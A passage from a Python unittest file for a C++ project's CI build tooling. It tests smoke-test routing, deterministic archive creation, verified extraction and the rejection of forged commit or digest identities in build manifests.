                        "backtraceGraph": {"commands": [], "files": [], "nodes": []},
                        "kind": "ctestInfo",
                        "tests": tests,
                        "version": {"major": 1, "minor": 0},
                    }
                    self._write_raw_route_bundle(
                        raw,
                        (json.dumps(payload) + "\n").encode("utf-8"),
                        candidate_commit=candidate_commit,
                    )
                    self._run_protected_control(
                        candidate,
                        candidate_commit,
                        raw,
                        output,
                        github_output,
                        expect_success=False,
                    )
                    self.assertFalse(
                        (output / "build-smoke-control.manifest.json").exists()
                    )
                    self.assertFalse(
                        (output / "build_smoke_matrix.txt").exists()
                    )
                    self.assertEqual(
                        github_output.read_text(encoding="utf-8"), "sentinel\n"
                    )

            raw = temporary / "raw-undeclared"
            self._write_raw_route_bundle(
                raw,
                (json.dumps(
                    {
                        "backtraceGraph": {"commands": [], "files": [], "nodes": []},
                        "kind": "ctestInfo",
                        "tests": base_tests,
                        "version": {"major": 1, "minor": 0},
                    }
                ) + "\n").encode("utf-8"),
                candidate_commit=candidate_commit,
            )
            (raw / "candidate-route.py").write_text("untrusted\n", encoding="utf-8")
            github_output = temporary / "github-output-undeclared"
            github_output.write_text("sentinel\n", encoding="utf-8")
            self._run_protected_control(
                candidate,
                candidate_commit,
                raw,
                temporary / "output-undeclared",
                github_output,
                expect_success=False,
            )
            self.assertEqual(github_output.read_text(encoding="utf-8"), "sentinel\n")

            valid_payload = (
                json.dumps(
                    {
                        "backtraceGraph": {
                            "commands": [],
                            "files": [],
                            "nodes": [],
                        },
                        "kind": "ctestInfo",
                        "tests": base_tests,
                        "version": {"major": 1, "minor": 0},
                    }
                )
                + "\n"
            ).encode("utf-8")
            identity_cases = (
                ("candidate-identity", "candidate_commit", COMMIT_B),
                ("workflow-identity", "workflow_commit", COMMIT_B),
                ("image-identity", "image_digest", "sha256:" + "5" * 64),
            )
            for label, field, forged_value in identity_cases:
                with self.subTest(raw_identity_drift=label):
                    raw = temporary / f"raw-{label}"
                    self._write_raw_route_bundle(
                        raw,
                        valid_payload,
                        candidate_commit=candidate_commit,
                    )
                    manifest_path = raw / "raw-inventory.manifest.json"
                    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
                    manifest[field] = forged_value
                    manifest_path.write_text(
                        json.dumps(
                            manifest,
                            sort_keys=True,
                            separators=(",", ":"),
                            ensure_ascii=True,
                        )
                        + "\n",
                        encoding="utf-8",
                    )
                    github_output = temporary / f"github-output-{label}"
                    github_output.write_text("sentinel\n", encoding="utf-8")
                    self._run_protected_control(
                        candidate,
                        candidate_commit,
                        raw,
                        temporary / f"output-{label}",
                        github_output,
                        expect_success=False,
                    )
                    self.assertEqual(
                        github_output.read_text(encoding="utf-8"), "sentinel\n"
                    )

            raw = temporary / "raw-matrix-digest"
            self._write_raw_route_bundle(
                raw,
                valid_payload,
                candidate_commit=candidate_commit,
            )
            sidecar = raw / "build_profile_matrix_v1.tsv.sha256"
            sidecar.write_text(
                f"{'6' * 64}  build_profile_matrix_v1.tsv\n", encoding="utf-8"
            )
            manifest_path = raw / "raw-inventory.manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            for record in manifest["files"]:
                if record["path"] == sidecar.name:
                    content = sidecar.read_bytes()
                    record["sha256"] = hashlib.sha256(content).hexdigest()
                    record["size"] = len(content)
            manifest_path.write_text(
                json.dumps(
                    manifest,
                    sort_keys=True,
                    separators=(",", ":"),
                    ensure_ascii=True,
                )
                + "\n",
                encoding="utf-8",
            )
            github_output = temporary / "github-output-matrix-digest"
            github_output.write_text("sentinel\n", encoding="utf-8")
            self._run_protected_control(
                candidate,
                candidate_commit,
                raw,
                temporary / "output-matrix-digest",
                github_output,
                expect_success=False,
            )
            self.assertEqual(github_output.read_text(encoding="utf-8"), "sentinel\n")

            overlap_output = temporary / "github-output-overlap"
            overlap_output.write_text("sentinel\n", encoding="utf-8")
            overlapped = run_command(
                sys.executable,
                SCRIPTS / "build_smoke_route.py",
                "control",
                "--raw-dir",
                candidate,
                "--candidate-root",
                candidate,
                "--control-root",
                REPO_ROOT,
                "--output-dir",
                temporary / "output-overlap",
                "--candidate-commit",
                candidate_commit,
                "--workflow-commit",
                COMMIT_A,
                "--image-digest",
                IMAGE_DIGEST,
                "--profile",
                "default",
                "--github-output",
                overlap_output,
                expect_success=False,
            )
            self.assertIn("routing boundaries overlap", overlapped.stderr)
            self.assertEqual(
                overlap_output.read_text(encoding="utf-8"), "sentinel\n"
            )

    def test_current_main_routing_is_complete_and_role_explicit(self) -> None:
        """Route all four partitions once and reject a missing locked entry.

        Returns:
            None after exact role matrices match the reviewed lock.

        Raises:
            AssertionError: A route overlaps, changes role, or a locked smoke
                can disappear without fail-closed rejection.

        Note:
            This low-level partition test complements the real fresh-control
            workflow fixture without creating any GitHub output.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            matrix = root / "matrix.json"
            entries = [
                {"artifact": "dependency-disabled", "test": "DependencyDisabledInstallSmoke"},
                {
                    "artifact": "openexr-option-off",
                    "test": "OpenExrDeepProviderOptionOffSmoke",
                },
                {"artifact": "public-header", "test": "PublicHeaderSelfContainment"},
                {"artifact": "static-product", "test": "StaticProductConsumerSmoke"},
            ]
            matrix.write_text(
                json.dumps({"include": entries}, sort_keys=True, separators=(",", ":")) + "\n",
                encoding="utf-8",
            )
            module_path = SCRIPTS / "build_smoke_route.py"
            specification = importlib.util.spec_from_file_location(
                "build_smoke_route_partition_test", module_path
            )
            self.assertIsNotNone(specification)
            self.assertIsNotNone(specification.loader)
            module = importlib.util.module_from_spec(specification)
            specification.loader.exec_module(module)
            routed, dedicated, openexr, producer = module.route(
                matrix, REPO_ROOT / "ci/locks/build-smoke-routing.json"
            )
            self.assertEqual(
                routed,
                {
                    "include": [
                        {
                            "artifact": "dependency-disabled",
                            "artifact_role": "ctest-control",
                            "test": "DependencyDisabledInstallSmoke",
                        }
                    ]
                },
            )
            self.assertEqual(
                producer,
                {
                    "include": [
                        {
                            "artifact": "public-header",
                            "artifact_role": "ctest-control",
                            "test": "PublicHeaderSelfContainment",
                        }
                    ]
                },
            )
            self.assertEqual(
                dedicated,
                {
                    "include": [
                        {
                            "artifact": "static-product",
                            "artifact_role": "installed-package",
                            "test": "StaticProductConsumerSmoke",
                        }
                    ]
                },
            )
            self.assertEqual(
                openexr,
                {
                    "include": [
                        {
                            "artifact": "openexr-option-off",
                            "artifact_role": "openexr-metadata",
                            "test": "OpenExrDeepProviderOptionOffSmoke",
                        }
                    ]
                },
            )

            matrix.write_text(
                json.dumps({"include": entries[:-1]}, sort_keys=True, separators=(",", ":")) + "\n",
                encoding="utf-8",
            )
            with self.assertRaises(module.RoutingError) as raised:
                module.route(
                    matrix, REPO_ROOT / "ci/locks/build-smoke-routing.json"
                )
            self.assertIn("installed-package tests differ", str(raised.exception))

    def test_openexr_metadata_runner_replays_the_exact_source_driver_boundary(self) -> None:
        """Pass only cache metadata and the locked option-off identity to Python."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            binary_dir = root / "bin"
            binary_dir.mkdir()
            invocation_log = root / "openexr-invocation.json"
            for executable_name in ("cmake", "ctest", "nm"):
                executable = binary_dir / executable_name
                executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
                executable.chmod(0o755)
            registered_python = binary_dir / "registered-python"
            registered_python.write_text(
                f"#!{sys.executable}\n"
                "import json\n"
                "import os\n"
                "import sys\n"
                "with open(os.environ['CI_TEST_OPENEXR_LOG'], 'w', encoding='utf-8') as handle:\n"
                "    json.dump(sys.argv[1:], handle, separators=(',', ':'))\n",
                encoding="utf-8",
            )
            registered_python.chmod(0o755)
            path_python = binary_dir / "python3"
            path_python.write_text(
                "#!/bin/sh\n"
                "echo 'PATH python must not execute OpenEXR smoke' >&2\n"
                "exit 97\n",
                encoding="utf-8",
            )
            path_python.chmod(0o755)
            metadata_root = root / "metadata/ci"
            producer = metadata_root / "producer"
            producer.mkdir(parents=True)
            (producer / "CMakeCache.txt").write_text(
                "CMAKE_BUILD_TYPE:STRING=Release\n"
                f"CMAKE_COMMAND:INTERNAL={binary_dir / 'cmake'}\n"
                f"CMAKE_CTEST_COMMAND:INTERNAL={binary_dir / 'ctest'}\n"
                f"CMAKE_NM:FILEPATH={binary_dir / 'nm'}\n"
                f"_Python3_EXECUTABLE:INTERNAL={registered_python}\n",
                encoding="utf-8",
            )
            environment = {
                "CI_ARTIFACT_DIR": str(root / "artifacts"),
                "CI_ARTIFACT_ROLE": "openexr-metadata",
                "CI_OPENEXR_METADATA_ROOT": str(metadata_root),
                "CI_TEST_OPENEXR_LOG": str(invocation_log),
                "CMAKE_BUILD_TYPE": "Debug",
                "PATH": f"{binary_dir}:{os.environ['PATH']}",
                "SMOKE_TEST_NAME": "OpenExrDeepProviderOptionOffSmoke",
            }
            run_command(
                "bash", SCRIPTS / "openexr_smoke_test.sh", environment=environment
            )
            arguments = json.loads(invocation_log.read_text(encoding="utf-8"))
            self.assertEqual(arguments[:2], ["-B", str(REPO_ROOT / "tests/integration/openexr_deep_provider_option_off_smoke.py")])
            expected_pairs = {
                "--repo": str(REPO_ROOT),
                "--producer-build": str(producer),
                "--cmake-executable": str(binary_dir / "cmake"),
                "--ctest-executable": str(binary_dir / "ctest"),
                "--symbol-tool": str(binary_dir / "nm"),
                "--config": "Release",
                "--mode": "off",
            }
            for option, expected in expected_pairs.items():
                index = arguments.index(option)
                self.assertEqual(arguments[index + 1], expected)

            invocation_log.unlink()
            failed = run_command(
                "bash",
                SCRIPTS / "openexr_smoke_test.sh",
                environment={**environment, "SMOKE_TEST_NAME": "ForgedOpenExrSmoke"},
                expect_success=False,
            )
            self.assertIn("Unsupported OpenEXR metadata smoke identity", failed.stderr)
            self.assertFalse(invocation_log.exists())

            valid_cache = (producer / "CMakeCache.txt").read_text(encoding="utf-8")
            invalid_caches = {
                "missing": valid_cache.replace(
                    "CMAKE_BUILD_TYPE:STRING=Release\n", ""
                ),
                "empty": valid_cache.replace(
                    "CMAKE_BUILD_TYPE:STRING=Release",
                    "CMAKE_BUILD_TYPE:STRING=",
                ),
                "control": valid_cache.replace(
                    "CMAKE_BUILD_TYPE:STRING=Release",
                    "CMAKE_BUILD_TYPE:STRING=Release\tDebug",
                ),
                "multi-config": valid_cache
                + "CMAKE_CONFIGURATION_TYPES:STRING=Debug;Release\n",
            }
            expected_diagnostics = {
                "missing": "exactly one CMAKE_BUILD_TYPE",
                "empty": "invalid CMAKE_BUILD_TYPE",
                "control": "invalid CMAKE_BUILD_TYPE",
                "multi-config": "does not accept a multi-config",
            }
            for label, cache_text in invalid_caches.items():
                with self.subTest(cache=label):
                    (producer / "CMakeCache.txt").write_text(
                        cache_text, encoding="utf-8"
                    )
                    invocation_log.unlink(missing_ok=True)
                    rejected = run_command(
                        "bash",
                        SCRIPTS / "openexr_smoke_test.sh",
                        environment=environment,
                        expect_success=False,
                    )
                    self.assertIn(expected_diagnostics[label], rejected.stderr)
                    self.assertFalse(invocation_log.exists())
            (producer / "CMakeCache.txt").write_text(
                valid_cache, encoding="utf-8"
            )


class ReusableBuildContractTest(unittest.TestCase):
    """Exercise deterministic packing, exact identity checks, and safe extraction."""

    @staticmethod
    def _load_reusable_module() -> object:
        """Load the protected producer module for deterministic fixture emission."""
        module_path = SCRIPTS / "reusable_build.py"
        specification = importlib.util.spec_from_file_location("reusable_build_contract", module_path)
        if specification is None or specification.loader is None:
            raise AssertionError("cannot load reusable build module")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    @staticmethod
    def _load_ctest_closure_module() -> object:
        """Load the protected ordinary CTest closure implementation."""
        module_path = SCRIPTS / "ctest_runtime_closure.py"
        specification = importlib.util.spec_from_file_location(
            "ctest_runtime_closure_contract", module_path
        )
        if specification is None or specification.loader is None:
            raise AssertionError("cannot load ordinary CTest closure module")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    @staticmethod
    def _prepare_build(
        source: Path,
        *,
        runtime_alias: bool = False,
        candidate_root: Path = REPO_ROOT,
        candidate_commit: str = COMMIT_A,
    ) -> Path:
        """Materialize one complete fresh CMake/package/generated build fixture.

        Args:
            source: Fixture build root.
            runtime_alias: Whether to add a safe versioned DSO alias for the
                targeted-role materialization contract.
            candidate_root: Exact source checkout whose ordinary source inputs
                and completion identity are bound into the fixture.
            candidate_commit: Exact ``candidate_root`` HEAD identity.

        Returns:
            Generated CI inventory directory.
        """
        source.mkdir(parents=True, exist_ok=True)
        executable = source / "bin/tool"
        executable.parent.mkdir(parents=True, exist_ok=True)
        executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        executable.chmod(0o755)
        test_executable = source / "tests/test_contract"
        test_executable.parent.mkdir(parents=True, exist_ok=True)
        test_executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        test_executable.chmod(0o755)
        command_data = source / "tests/relative-command-data.bin"
        command_data.write_bytes(b"ordinary-relative-command-data")
        required_data = source / "tests/relative-required-data.bin"
        required_data.write_bytes(b"ordinary-relative-required-data")
        environment_data = source / "tests/relative-environment-data.bin"
        environment_data.write_bytes(b"ordinary-relative-environment-data")
        environment_path = source / "tests/relative-environment-path"
        environment_path.mkdir(exist_ok=True)
        (environment_path / "path-entry.bin").write_bytes(
            b"ordinary-relative-environment-path"
        )
        (source / "tests/unreferenced-working-directory-data.bin").write_bytes(
            b"must-not-be-selected-by-working-directory"
        )
        plugin = source / "plugins/runtime_contract_plugin.so"
        plugin.parent.mkdir(parents=True, exist_ok=True)
        plugin.write_bytes(b"runtime-plugin")
        trust_manifest = source / "generated/plugin_trust/manifest.txt"
        trust_manifest.parent.mkdir(parents=True, exist_ok=True)
        trust_manifest.write_text("runtime trust manifest\n", encoding="utf-8")
        trust_signature = source / "generated/plugin_trust/signature.hex"
        trust_signature.write_text("00\n", encoding="utf-8")
        nonstandard_include = source / "contract-discovery.cmake"
        nonstandard_include.write_text(
            'add_test(test_contract "./test_contract" '
            '"relative-command-data.bin")\n'
            "set_tests_properties(test_contract PROPERTIES\n"
            '  REQUIRED_FILES "relative-required-data.bin"\n'
            '  ENVIRONMENT "PHOTOSPIDER_RELATIVE_ENV_FILE='
            'relative-environment-data.bin;'
            f'PHOTOSPIDER_PLUGIN_TRUST_MANIFEST={trust_manifest};'
            f'PHOTOSPIDER_PLUGIN_TRUST_SIGNATURE={trust_signature};'
            "PHOTOSPIDER_PLUGIN_TRUST_PUBLIC_KEY="
              f'{candidate_root / "tests/fixtures/trust/test_ed25519_public_key.pem"}"\n'
            '  ENVIRONMENT_MODIFICATION '
            '"PHOTOSPIDER_RELATIVE_PATH=path_list_prepend:'
            'relative-environment-path"\n'
            '  WORKING_DIRECTORY "tests")\n',
            encoding="utf-8",
        )
        (source / "CTestTestfile.cmake").write_text(
            f'include("{nonstandard_include}")\n', encoding="utf-8"
        )
        runtime_library = source / "lib/libphotospider_runtime.so"
        runtime_library.parent.mkdir(parents=True, exist_ok=True)
        runtime_library.write_bytes(b"runtime-shared-object")
        runtime_alias_path = source / "lib/libphotospider_runtime.so.0"
        if runtime_alias_path.exists() or runtime_alias_path.is_symlink():
            runtime_alias_path.unlink()
        if runtime_alias:
            runtime_alias_path.symlink_to(runtime_library.name)
        object_file = source / "CMakeFiles/photospider.dir/product.cpp.o"
        object_file.parent.mkdir(parents=True, exist_ok=True)
        object_file.write_bytes(b"producer-object")
        (source / "lib/libphotospider.a").write_bytes(b"producer-static-library")
        dependency_file = source / "CMakeFiles/photospider.dir/product.cpp.o.d"
        dependency_file.write_text("product.cpp.o: product.cpp\n", encoding="utf-8")
        (source / "CMakeCache.txt").write_text(
            "BUILD_TESTING:BOOL=ON\n"
            "CMAKE_BUILD_TYPE:STRING=RelWithDebInfo\n"
            "CMAKE_CXX_COMPILER:FILEPATH=/usr/bin/clang++\n"
            "CMAKE_GENERATOR:INTERNAL=Ninja\n"
            "CMAKE_PROJECT_NAME:STATIC=photospider\n"
            "PHOTOSPIDER_BUILD_IPC:BOOL=ON\n"
            "USE_ASAN:BOOL=OFF\n"
            "USE_TSAN:BOOL=OFF\n",
            encoding="utf-8",
        )
        module_dir = source / "CMakeFiles/3.31.0"
        module_dir.mkdir(parents=True, exist_ok=True)
        (module_dir / "CMakeCXXCompiler.cmake").write_text(
            'set(CMAKE_CXX_COMPILER "/usr/bin/clang++")\n'
            'set(CMAKE_CXX_COMPILER_ID "Clang")\n'
            'set(CMAKE_CXX_COMPILER_VERSION "18.1.8")\n',
            encoding="utf-8",
        )
        (module_dir / "CMakeSystem.cmake").write_text(
            'set(CMAKE_SYSTEM_NAME "Linux")\n'
            'set(CMAKE_SYSTEM_PROCESSOR "x86_64")\n',
            encoding="utf-8",
        )
        (source / "PhotospiderConfig.cmake").write_text(
            "set(Photospider_embedded_FOUND TRUE)\n"
            "set(Photospider_policy_sdk_FOUND ON)\n",
            encoding="utf-8",
        )
        export = source / "CMakeFiles/Export/fixture/PhotospiderTargets.cmake"
        export.parent.mkdir(parents=True, exist_ok=True)
        export.write_text(
            "add_library(Photospider::photospider_kernel STATIC IMPORTED)\n"
            "add_library(Photospider::policy_sdk INTERFACE IMPORTED)\n",
            encoding="utf-8",
        )
        inventory = source / "generated/ci_inventory"
        inventory.mkdir(parents=True, exist_ok=True)
        (inventory / "installable_public_headers.txt").write_text(
            "include/photospider/core/graph.hpp\n", encoding="utf-8"
        )
        (inventory / "registered_gtest_targets-RelWithDebInfo.tsv").write_text(
            "# target\tconfigured executable\n"
            "test_contract\t/tmp/test_contract\n",
            encoding="utf-8",
        )
        (source / ".photospider-ci-build-complete").write_text(
            f"build_dir={source.resolve()}\n"
            f"source_dir={candidate_root.resolve()}\n"
            "profile=default\n"
            "build_testing=ON\n"
            "photospider_build_ipc=ON\n"
            f"candidate_commit={candidate_commit}\n"
            "created_at=2026-08-25T12:00:00Z\n",
            encoding="utf-8",
        )
        inventory_path = source.parent / "post-build-ctest-inventory.json"
        discovered = subprocess.run(
            [
                "ctest",
                "--test-dir",
                str(source),
                "--show-only=json-v1",
                "-C",
                "RelWithDebInfo",
            ],
            check=True,
            capture_output=True,
        )
        inventory_path.write_bytes(discovered.stdout)
        closure = ReusableBuildContractTest._load_ctest_closure_module()
        closure.write_closure(
            candidate_root,
            source,
            inventory_path,
            inventory / "ordinary_ctest_closure_v1.json",
            "RelWithDebInfo",
        )
        return inventory

    def _create(self, root: Path, suffix: str) -> tuple[Path, Path, dict[str, object]]:
        """Create one test archive and return its paths and parsed manifest."""
        source = root / "source"
        inventory = self._prepare_build(source)
        archive = root / f"ci-build-{suffix}.tar.gz"
        manifest = root / f"ci-build-{suffix}.manifest.json"
        run_command(
            sys.executable, SCRIPTS / "reusable_build.py",
            "--inventory-dir", inventory,
            "create",
            "--source", source,
            "--archive", archive,
            "--manifest", manifest,
            "--candidate-commit", COMMIT_A,
            "--profile", "default",
            "--image-digest", IMAGE_DIGEST,
            "--workflow-commit", COMMIT_B,
        )
        return archive, manifest, json.loads(manifest.read_text(encoding="utf-8"))

    def _create_targeted(
        self, root: Path, role: str, payload: Path | None = None
    ) -> tuple[Path, Path, dict[str, object]]:
        """Create one role-minimal artifact from the complete fixture build."""
        source = root / "targeted-root/ci"
        inventory = self._prepare_build(source, runtime_alias=True)
        archive = root / f"{role}.tar.gz"
        manifest = root / f"{role}.manifest.json"
        arguments: list[object] = [
            sys.executable, SCRIPTS / "reusable_build.py",
            "--inventory-dir", inventory,
            "create-targeted",
            "--source", source,
            "--role", role,
            "--archive", archive,
            "--manifest", manifest,
            "--candidate-commit", COMMIT_A,
            "--profile", "default",
            "--image-digest", IMAGE_DIGEST,
            "--workflow-commit", COMMIT_B,
        ]
        if payload is not None:
            arguments.extend(("--payload-source", payload))
        run_command(*arguments)
        return archive, manifest, json.loads(manifest.read_text(encoding="utf-8"))

    @staticmethod
    def _prepare_installed_prefix(root: Path) -> Path:
        """Create one minimal installed-package role fixture.

        Args:
            root: Existing test-owned root.

        Returns:
            Fresh installed prefix containing a public header, package config,
            static product library, and one versioned runtime DSO alias.
        """
        installed = root / "installed-prefix"
        (installed / "include/photospider").mkdir(parents=True)
        (installed / "include/photospider/product.hpp").write_text(
            "#pragma once\n", encoding="utf-8"
        )
        (installed / "lib/cmake/Photospider").mkdir(parents=True)
        (installed / "lib/cmake/Photospider/PhotospiderConfig.cmake").write_text(
            "set(Photospider_FOUND TRUE)\n", encoding="utf-8"
        )
        (installed / "lib/libphotospider.a").write_bytes(b"installed-product")
        installed_runtime = installed / "lib/libphotospider_runtime.so.1.0"
        installed_runtime.write_bytes(b"installed-runtime")
        (installed / "lib/libphotospider_runtime.so.1").symlink_to(
            installed_runtime.name
        )
        return installed

    def test_deterministic_archive_and_exact_safe_extraction(self) -> None:
        """Produce identical archives and reject a wrong expected candidate."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            archive_a, manifest_a, identity = self._create(root, "a")
            archive_b, _, _ = self._create(root, "b")
            self.assertEqual(hashlib.sha256(archive_a.read_bytes()).digest(), hashlib.sha256(archive_b.read_bytes()).digest())
            destination = root / "restored"
            common = (
                "--archive", archive_a,
                "--manifest", manifest_a,
                "--profile", "default",
                "--matrix-sha256", identity["matrix_sha256"],
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
            )
            run_command(
                sys.executable, SCRIPTS / "reusable_build.py", "verify-extract",
                *common,
                "--candidate-commit", COMMIT_A,
                "--destination", destination,
            )
            self.assertEqual((destination / "ci/bin/tool").read_text(encoding="utf-8"), "#!/bin/sh\nexit 0\n")
            failed = run_command(
                sys.executable, SCRIPTS / "reusable_build.py", "verify-only",
                *common,
                "--candidate-commit", "4" * 40,
                expect_success=False,
            )
            self.assertIn("candidate_commit mismatch", failed.stderr)

    def test_targeted_roles_bind_content_size_and_forbid_build_residue(self) -> None:
        """Keep role members exact and reject object/dependency fan-out drift."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = root / "installed-prefix"
            (installed / "include/photospider").mkdir(parents=True)
            (installed / "include/photospider/product.hpp").write_text(
                "#pragma once\n", encoding="utf-8"
            )
            (installed / "lib/cmake/Photospider").mkdir(parents=True)
            (installed / "lib/cmake/Photospider/PhotospiderConfig.cmake").write_text(
                "set(Photospider_FOUND TRUE)\n", encoding="utf-8"
            )
            (installed / "lib/libphotospider.a").write_bytes(b"installed-product")
            installed_runtime = installed / "lib/libphotospider_runtime.so.1.0"
            installed_runtime.write_bytes(b"installed-runtime")
            (installed / "lib/libphotospider_runtime.so.1").symlink_to(
                installed_runtime.name
            )

            role_values: dict[str, tuple[Path, Path, dict[str, object]]] = {}
            for role in (
                "ctest-control",
                "ctest-runtime",
                "installed-package",
                "openexr-metadata",
            ):
                role_values[role] = self._create_targeted(
                    root, role, installed if role == "installed-package" else None
                )

            control = role_values["ctest-control"][2]
            runtime = role_values["ctest-runtime"][2]
            package = role_values["installed-package"][2]
            openexr = role_values["openexr-metadata"][2]
            control_paths = [member["path"] for member in control["content"]["members"]]
            runtime_paths = [member["path"] for member in runtime["content"]["members"]]
            package_paths = [member["path"] for member in package["content"]["members"]]
            openexr_paths = [
                member["path"] for member in openexr["content"]["members"]
            ]
            self.assertIn("CMakeCache.txt", control_paths)
            self.assertIn("CTestTestfile.cmake", control_paths)
            self.assertNotIn("bin/tool", control_paths)
            self.assertNotIn("bin/tool", runtime_paths)
            self.assertIn("tests/test_contract", runtime_paths)
            self.assertIn("tests/relative-command-data.bin", runtime_paths)
            self.assertIn("tests/relative-required-data.bin", runtime_paths)
            self.assertIn("tests/relative-environment-data.bin", runtime_paths)
            self.assertIn(
                "tests/relative-environment-path/path-entry.bin", runtime_paths
            )
            self.assertNotIn(
                "tests/unreferenced-working-directory-data.bin", runtime_paths
            )
            self.assertIn("lib/libphotospider_runtime.so", runtime_paths)
            self.assertIn("lib/libphotospider_runtime.so.0", runtime_paths)
            self.assertIn("plugins/runtime_contract_plugin.so", runtime_paths)
            self.assertIn("generated/plugin_trust/manifest.txt", runtime_paths)
            self.assertFalse(any(path.endswith((".o", ".o.d", ".a")) for path in runtime_paths))
            self.assertTrue(
                all(
                    path.startswith("installed/")
                    or path
                    in {
                        "producer/CMakeCache.txt",
                        "producer/generated/ci_inventory/installable_public_headers.txt",
                    }
                    for path in package_paths
                )
            )
            self.assertIn("installed/lib/libphotospider.a", package_paths)
            self.assertIn("installed/lib/libphotospider_runtime.so.1", package_paths)
            self.assertIn("producer/CMakeCache.txt", package_paths)
            self.assertIn(
                "producer/generated/ci_inventory/installable_public_headers.txt",
                package_paths,
            )
            self.assertEqual(openexr_paths, ["producer/CMakeCache.txt"])
            for identity in (control, runtime, package, openexr):
                members = identity["content"]["members"]
                self.assertEqual(
                    identity["content"]["uncompressed_size"],
                    sum(member["size"] for member in members),
                )

            archive, manifest, identity = role_values["ctest-runtime"]
            destination = root / "targeted-root"
            shutil.rmtree(destination / "ci")
            run_command(
                sys.executable, SCRIPTS / "reusable_build.py", "verify-targeted-extract",
                "--archive", archive,
                "--manifest", manifest,
                "--role", "ctest-runtime",
                "--candidate-commit", COMMIT_A,
                "--profile", "default",
                "--matrix-sha256", identity["matrix_sha256"],
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
                "--destination", destination,
            )
            self.assertTrue((destination / "ci/tests/test_contract").is_file())
            self.assertTrue(
                (destination / "ci/lib/libphotospider_runtime.so.0").is_file()
            )
            self.assertFalse(
                (destination / "ci/lib/libphotospider_runtime.so.0").is_symlink()
            )

            identity["content"]["members"][0]["size"] += 1
            identity["content"]["uncompressed_size"] += 1
            manifest.write_text(
                json.dumps(identity, sort_keys=True, separators=(",", ":")) + "\n",
                encoding="utf-8",
            )
            failed = run_command(
                sys.executable, SCRIPTS / "reusable_build.py", "verify-targeted-only",
                "--archive", archive,
                "--manifest", manifest,
                "--role", "ctest-runtime",
                "--candidate-commit", COMMIT_A,
                "--profile", "default",
                "--matrix-sha256", identity["matrix_sha256"],
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
                expect_success=False,
            )
            self.assertIn("archived content differs", failed.stderr)

    def test_protected_targeted_verifier_cross_binds_distinct_roots_and_ctest_sets(
        self,
    ) -> None:
        """Bind two real commits plus raw, closure, and pure control coverage.

        Returns:
            None after the production CLIs accept one complete baseline and
            reject self-consistent ordinary-test removal, addition, relabeling,
            raw/control identity drift, and an aliased raw path.

        Raises:
            AssertionError: Protected code can be selected from the candidate,
                either checkout commit is unbound, or any cross-job coverage
                reduction reaches attestation-ready success.

        Note:
            The temporary candidate is a real clone with a second valid commit,
            so ``candidate_commit`` and ``workflow_commit`` cannot accidentally
            share the historical ``COMMIT_A`` fixture identity.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            candidate = root / "candidate"
            run_command("git", "clone", "-q", "--no-local", REPO_ROOT, candidate)
            run_command("git", "-C", candidate, "config", "user.name", "CI Test")
            run_command(
                "git",
                "-C",
                candidate,
                "config",
                "user.email",
                "ci-test@example.invalid",
            )
            candidate_readme = candidate / "readme.md"
            candidate_readme.write_text(
                candidate_readme.read_text(encoding="utf-8")
                + "\nRound 26 distinct candidate identity.\n",
                encoding="utf-8",
            )
            run_command("git", "-C", candidate, "add", "readme.md")
            run_command(
                "git", "-C", candidate, "commit", "-q", "-m", "candidate data"
            )
            candidate_commit = run_command(
                "git", "-C", candidate, "rev-parse", "HEAD"
            ).stdout.strip()
            self.assertRegex(candidate_commit, r"^[0-9a-f]{40}$")
            self.assertNotEqual(candidate_commit, COMMIT_A)

            producer_root = (root / "producer-build/ci").resolve(strict=False)
            inventory = self._prepare_build(
                producer_root,
                runtime_alias=True,
                candidate_root=candidate,
                candidate_commit=candidate_commit,
            )
            resolved_profile = run_command(
                sys.executable,
                candidate / "ci/scripts/ci_profile_manifest.py",
                "--repo-root",
                candidate,
                "--inventory-dir",
                inventory,
            )
            matrix_digest = json.loads(resolved_profile.stdout)["matrix_sha256"]
            raw_inventory_path = producer_root.parent / "post-build-ctest-inventory.json"
            registrations = ""
            for name in (
                "DependencyDisabledInstallSmoke",
                "OpenExrDeepProviderOptionOffSmoke",
                "PublicHeaderSelfContainment",
                "StaticProductConsumerSmoke",
            ):
                registrations += (
                    f'add_test({name} "/usr/bin/true")\n'
                    f'set_tests_properties({name} PROPERTIES LABELS "build-smoke")\n'
                )
            with (producer_root / "CTestTestfile.cmake").open(
                "a", encoding="utf-8"
            ) as handle:
                handle.write(registrations)
            discovered = subprocess.run(
                [
                    "ctest",
                    "--test-dir",
                    str(producer_root),
                    "--show-only=json-v1",
                    "-C",
                    "RelWithDebInfo",
                ],
                check=True,
                capture_output=True,
            )
            raw_inventory_path.write_bytes(discovered.stdout)
            closure = self._load_ctest_closure_module()
            closure.write_closure(
                candidate,
                producer_root,
                raw_inventory_path,
                inventory / "ordinary_ctest_closure_v1.json",
                "RelWithDebInfo",
            )
            raw_payload = json.loads(raw_inventory_path.read_text(encoding="utf-8"))

            artifact_root = root / "targeted-artifacts"
            for role in ("ctest-control", "ctest-runtime"):
                role_root = artifact_root / role
                role_root.mkdir(parents=True)
                run_command(
                    sys.executable,
                    SCRIPTS / "reusable_build.py",
                    "--repo-root",
                    candidate,
                    "--inventory-dir",
                    inventory,
                    "create-targeted",
                    "--source",
                    producer_root,
                    "--role",
                    role,
                    "--archive",
                    role_root / f"{role}.tar.gz",
                    "--manifest",
                    role_root / f"{role}.manifest.json",
                    "--candidate-commit",
                    candidate_commit,
                    "--profile",
                    "default",
                    "--image-digest",
                    IMAGE_DIGEST,
                    "--workflow-commit",
                    COMMIT_A,
                )

            # Pack a second pair whose generated control contains a real
